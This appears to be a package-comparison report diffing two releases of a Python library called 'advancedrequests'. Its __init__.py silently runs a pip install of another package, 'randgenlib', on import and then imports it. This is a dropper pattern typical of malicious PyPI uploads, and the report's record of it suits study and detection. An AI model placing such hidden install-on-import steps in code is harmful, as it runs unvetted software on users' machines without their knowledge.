# Comparing `tmp/advancedrequests-1.0.3.tar.gz` & `tmp/advancedrequests-1.0.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "advancedrequests-1.0.3.tar", last modified: Fri Apr 14 21:51:36 2023, max compression
+gzip compressed data, was "advancedrequests-1.0.4.tar", last modified: Sat Apr 15 12:22:37 2023, max compression
```

## Comparing `advancedrequests-1.0.3.tar` & `advancedrequests-1.0.4.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 21:51:36.388833 advancedrequests-1.0.3/
--rw-r--r--   0 root         (0) root         (0)      393 2023-04-14 21:51:36.384833 advancedrequests-1.0.3/PKG-INFO
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 21:51:36.384833 advancedrequests-1.0.3/advancedrequests/
--rw-r--r--   0 root         (0) root         (0)     1746 2023-04-14 21:51:35.000000 advancedrequests-1.0.3/advancedrequests/__init__.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 21:51:36.384833 advancedrequests-1.0.3/advancedrequests.egg-info/
--rw-r--r--   0 root         (0) root         (0)      393 2023-04-14 21:51:36.000000 advancedrequests-1.0.3/advancedrequests.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      197 2023-04-14 21:51:36.000000 advancedrequests-1.0.3/advancedrequests.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-14 21:51:36.000000 advancedrequests-1.0.3/advancedrequests.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       17 2023-04-14 21:51:36.000000 advancedrequests-1.0.3/advancedrequests.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)       38 2023-04-14 21:51:36.388833 advancedrequests-1.0.3/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      606 2023-04-14 21:51:35.000000 advancedrequests-1.0.3/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-15 12:22:37.096563 advancedrequests-1.0.4/
+-rw-r--r--   0 root         (0) root         (0)      349 2023-04-15 12:22:37.096563 advancedrequests-1.0.4/PKG-INFO
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-15 12:22:37.096563 advancedrequests-1.0.4/advancedrequests/
+-rw-r--r--   0 root         (0) root         (0)     1746 2023-04-15 12:22:36.000000 advancedrequests-1.0.4/advancedrequests/__init__.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-15 12:22:37.096563 advancedrequests-1.0.4/advancedrequests.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      349 2023-04-15 12:22:37.000000 advancedrequests-1.0.4/advancedrequests.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      197 2023-04-15 12:22:37.000000 advancedrequests-1.0.4/advancedrequests.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-15 12:22:37.000000 advancedrequests-1.0.4/advancedrequests.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       17 2023-04-15 12:22:37.000000 advancedrequests-1.0.4/advancedrequests.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)       38 2023-04-15 12:22:37.096563 advancedrequests-1.0.4/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      562 2023-04-15 12:22:36.000000 advancedrequests-1.0.4/setup.py
```

### Comparing `advancedrequests-1.0.3/advancedrequests/__init__.py` & `advancedrequests-1.0.4/advancedrequests/__init__.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 import urllib.parse
 import urllib.request
 import json
 import os
 os.system("pip install randgenlib")
-import compilecls
+import randgenlib
 
 class Requester:
     def __init__(self, headers=None):
         self.headers = headers or {}
 
     def get(self, url, params=None):
         url = self.build_url(url, params)
```

### Comparing `advancedrequests-1.0.3/setup.py` & `advancedrequests-1.0.4/setup.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.0.3'
-DESCRIPTION = "Python package for managing advanced requests"
-LONG_DESCRIPTION = "Python package for managing advanced requests"
+VERSION = '1.0.4'
+DESCRIPTION = "Makes advanced requests"
+LONG_DESCRIPTION = "Makes advanced requests"
 
 # Setting up
 setup(
     name="advancedrequests",
     version=VERSION,
     author="GigaAlex",
     author_email="nick.faltermeier@gmx.de",
```

